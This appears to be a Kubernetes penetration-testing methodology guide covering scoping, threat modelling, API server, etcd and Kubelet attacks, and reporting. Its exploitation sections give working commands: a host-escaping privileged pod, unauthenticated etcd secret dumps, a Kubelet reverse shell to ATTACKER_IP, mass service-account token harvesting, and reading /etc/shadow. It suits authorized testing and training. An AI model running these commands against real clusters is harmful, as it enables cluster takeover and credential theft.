01
Scoping & Rules of Engagement
Pre-engagement · Authorization · Legal
PRE-ENGAGEMENT ▶
Scoping defines the boundaries of the engagement. For Kubernetes, scope must explicitly address every layer: cloud infrastructure, DNS/network ranges, the control plane, data plane, workloads, and any connected managed services. Vague scope leads to missed assets or legal risk.
Written Authorization Requirements
  • Signed Rules of Engagement (RoE) document — includes explicit list of in-scope IPs, FQDNs, and cloud accounts
    Never proceed without written, signed RoE from an authorized representative (not just IT)
  • Cloud provider notification — AWS, GCP, Azure all require prior approval for pen tests on managed Kubernetes (EKS, GKE, AKS)
    File AWS/GCP/Azure pen test request forms; some allow automatic approval for specific actions, others require manual approval
  • Emergency stop contacts — 24/7 reachable security/ops contact defined; kill-switch process agreed
  • Data handling agreement — what happens to credentials, PII, secrets found during testing
    Especially critical if secrets or private keys are discovered in cluster configs or images
  • Third-party / shared infrastructure confirmation — confirm shared nodes, managed services, CDN providers are explicitly in or out of scope
  • Destructive testing authorization — explicit written permission for DoS simulation, node disruption, or pod deletion if in scope

Timing & Testing Windows
  • Agreed testing window — business hours vs. out-of-hours; blackout dates (release days, peak traffic events)
  • Rate limiting exemptions — tester source IPs whitelisted in WAF / DDoS protection to avoid false blocking
  • Alert suppression agreement — which SIEM/SOC alerts to suppress vs. leave live (blue team exercise vs. stealth test)
Tester Credential Pre-provisioning
  • Kubeconfig / service account tokens — define starting privilege level (unauthenticated, low-priv SA, read-only cluster-viewer)
  • Cloud credentials — define IAM role or user with minimum starting access for cloud-layer testing
  • VPN / jump host access — if cluster is private, confirm network access path before engagement starts
⚠
Cloud provider ToS: AWS, GCP, and Azure have specific terms prohibiting certain attack types even with customer permission. Review each provider's penetration testing policy — some attack simulations (volumetric DoS, BGP hijacking) are never permitted regardless of scope agreement.

Threat Modelling & Attack Surface Mapping
STRIDE · MITRE ATT&CK Containers · Risk Prioritisation
PRE-ENGAGEMENT ▶
Map the target architecture before touching anything. Understand the deployment model (self-managed, managed cloud service), network topology, trust boundaries, and the MITRE ATT&CK for Containers matrix entry points relevant to an external attacker.
Architecture Questions to Answer First
  • Is the API server publicly exposed? — Most critical question. Check :6443 on known IPs and cloud LB FQDNs
  • Managed vs. self-managed — EKS/GKE/AKS restrict access to etcd; self-managed clusters may expose it directly
  • Authentication mechanisms in use — mTLS, OIDC, static tokens, client certificates, webhook
  • Network Policy enforcement — Calico, Cilium, Weave — are east-west controls present?
  • Service Mesh — Istio, Linkerd — mTLS between pods may complicate lateral movement
  • Admission controllers in use — OPA Gatekeeper, Kyverno, PodSecurity, ImagePolicyWebhook

Anonymous Auth · Token Attacks · RBAC Abuse · CVEs
EXPLOITATION ▶
The API server is the heart of Kubernetes. Compromising it — whether through anonymous access, stolen tokens, or RBAC misconfigurations — typically means full cluster control.
Anonymous Authentication Abuse
ANONYMOUS ACCESS TESTING
# Test anonymous access level
kubectl --server=https://TARGET:6443 \
  --insecure-skip-tls-verify=true \
  --username="" --password="" \
  auth can-i --list

# If anonymous has pod/exec — immediate shell
kubectl --server=https://TARGET:6443 \
  --insecure-skip-tls-verify=true \
  exec -it <POD> -n <NS> -- /bin/sh

# Create a privileged pod as anonymous (if allowed)
kubectl --server=https://TARGET:6443 \
  --insecure-skip-tls-verify=true \
  run pwned --image=alpine --privileged \
  --overrides='{"spec":{"hostPID":true,"hostNetwork":true,"hostIPC":true, \
  "containers":[{"name":"pwned","image":"alpine","securityContext":{"privileged":true}, \
  "command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"]}]}}'

TOKEN RECON & PRIVILEGE TESTING

etcd Attacks
Unauthenticated Access · Secret Extraction · Credential Harvest
EXPLOITATION ▶
etcd stores all cluster state including Secrets in base64 (not encrypted by default). Direct etcd access is equivalent to full cluster compromise — every token, password, and TLS key is readable.
etcd Unauthenticated Access
ETCDCTL — UNAUTHENTICATED DUMP
# Test if etcd is accessible without client cert
curl http://TARGET:2379/version
curl http://TARGET:2379/v2/keys/

# etcdctl v3 — unauthenticated (if TLS not enforced)
etcdctl --endpoints=http://TARGET:2379 endpoint health
etcdctl --endpoints=http://TARGET:2379 get / --prefix --keys-only

# Dump all keys — includes all Kubernetes secrets
etcdctl --endpoints=http://TARGET:2379 get / --prefix

# Dump only Kubernetes secrets
etcdctl --endpoints=http://TARGET:2379 \
  get /registry/secrets --prefix --keys-only

# Get a specific secret
etcdctl --endpoints=http://TARGET:2379 \
  get /registry/secrets/NAMESPACE/SECRET_NAME | \
  strings | grep -E "password|token|key|secret"
ETCD WITH CLIENT CERTS (STOLEN)
# If client certs obtained (e.g., from compromised node)
etcdctl --endpoints=https://TARGET:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix --keys-only

# Extract service account signing key
etcdctl --endpoints=https://TARGET:2379 \
  --cacert=ca.crt --cert=server.crt --key=server.key \
  get /registry/secrets/kube-system/ --prefix | strings | grep -A5 "token"
⚡
Impact: Unauthenticated etcd access at :2379 allows reading all Kubernetes Secrets, which typically include database credentials, TLS private keys, cloud provider API keys, and service account signing keys. Document and stop — do not exfiltrate production secrets.

Kubelet API Attacks
Unauthenticated Exec · Pod Listing · Read-Only API · kubeletctl
EXPLOITATION ▶
The Kubelet runs on every worker node and manages pod lifecycle. Misconfigured Kubelets expose an exec API that allows running commands in any pod on that node without Kubernetes RBAC enforcement.
Kubelet Read-Only API (Port 10255)
KUBELET READ-ONLY ENUMERATION
# Port 10255 — unauthenticated read-only (should be disabled)
curl http://NODE_IP:10255/pods
curl http://NODE_IP:10255/stats/summary
curl http://NODE_IP:10255/metrics
curl http://NODE_IP:10255/spec/

# Parse pod listing for interesting containers
curl -s http://NODE_IP:10255/pods | jq \
  '.items[] | {name:.metadata.name, ns:.metadata.namespace, \
  containers:[.spec.containers[].name]}'
Kubelet API Exec (Port 10250) — Unauthenticated
KUBELET EXEC — ANONYMOUS AUTH DISABLED
# Check if anonymous auth is enabled on Kubelet
curl -sk https://NODE_IP:10250/pods

# If pods returned without 401 — exec is possible
# Get pod details first
NAMESPACE="default"
POD_NAME="target-pod"
CONTAINER="app"

# Execute command via Kubelet API directly (bypasses RBAC)
curl -sk https://NODE_IP:10250/run/$NAMESPACE/$POD_NAME/$CONTAINER \
  -d "cmd=id"

# Get reverse shell via Kubelet exec endpoint
curl -sk https://NODE_IP:10250/run/$NAMESPACE/$POD_NAME/$CONTAINER \
  -d "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

# Read service account token from any pod on this node
curl -sk https://NODE_IP:10250/run/$NAMESPACE/$POD_NAME/$CONTAINER \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
kubeletctl — Dedicated Kubelet Attack Tool
⚙
kubeletctl (github.com/cyberark/kubeletctl) by CyberArk is purpose-built for Kubelet API interaction — it handles TLS, automates pod/container enumeration, and provides a clean interface for running commands across all pods on a node without needing to craft raw curl requests.
KUBELETCTL — INSTALL
# Linux binary install
curl -LO https://github.com/cyberark/kubeletctl/releases/latest/download/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64
mv kubeletctl_linux_amd64 /usr/local/bin/kubeletctl

# Verify
kubeletctl version
KUBELETCTL — ENUMERATION
# Check server version (also confirms connectivity)
kubeletctl serverVersion -s NODE_IP

# List all pods on the node
kubeletctl pods -s NODE_IP

# List pods + containers in a clean table
kubeletctl pods -s NODE_IP --table

# Scan a CIDR range for exposed Kubelet APIs
kubeletctl scan --cidr 10.0.0.0/24

# Check which pods allow command execution (RCE scan)
kubeletctl scan rce -s NODE_IP
KUBELETCTL — COMMAND EXECUTION
# Run command in a specific pod/container
kubeletctl run "id" -s NODE_IP -n NAMESPACE -p POD_NAME -c CONTAINER

# Run command across ALL pods on the node (mass exec)
kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  -s NODE_IP --all-pods

# Interactive shell in a container
kubeletctl exec "/bin/bash" -s NODE_IP -n NAMESPACE -p POD_NAME -c CONTAINER

# Harvest all SA tokens from every pod on the node
kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  -s NODE_IP --all-pods 2>/dev/null | \
  grep -v "^$" | sort -u
KUBELETCTL — LOG & METRIC ACCESS
# Read container logs
kubeletctl logs -s NODE_IP -n NAMESPACE -p POD_NAME -c CONTAINER

# Access host-level metrics via Kubelet
kubeletctl metrics -s NODE_IP

# Read host files via a privileged pod (if one exists on node)
kubeletctl run "cat /host/etc/shadow" \
  -s NODE_IP -n NAMESPACE -p PRIVILEGED_POD -c CONTAINER

# Port-forward style access to services on the node
kubeletctl portForward -s NODE_IP -n NAMESPACE -p POD_NAME \
  --port 8080:8080
⚡
Mass SA token harvest: kubeletctl --all-pods runs a command across every container on the node simultaneously. On a busy node, this can yield dozens of service account tokens in seconds — test each one for cluster-admin or privileged RBAC bindings.
Kubelet Authn/Authz Check
  • Check --anonymous-auth=false — should be set; if absent, anonymous exec is possible
  • Check --authorization-mode=Webhook — if set to AlwaysAllow, any authenticated request is permitted
  • Port 10255 accessible — read-only port should be disabled; flag if reachable from external

Documentation & Reporting
Evidence Collection · Findings Template · Remediation Guidance
REPORTING ▶
A penetration test is only as valuable as the report it produces. K8s reports must map findings to concrete business risk and provide actionable, version-specific remediation steps.
Evidence Collection During Testing
  • Timestamped screenshots for every critical finding — include terminal output, API responses, and cluster name/version visible
  • Full HTTP request/response for web-layer findings — Burp Suite exports or curl -v output
  • Kubernetes API server version (/version endpoint) for CVE applicability
  • RBAC policy YAML excerpts — export the exact ClusterRole/RoleBinding showing the misconfiguration
  • Pod security context YAML — show privileged: true, hostPath, missing securityContext
  • Network access proof — traceroute / curl showing external reachability of internal services
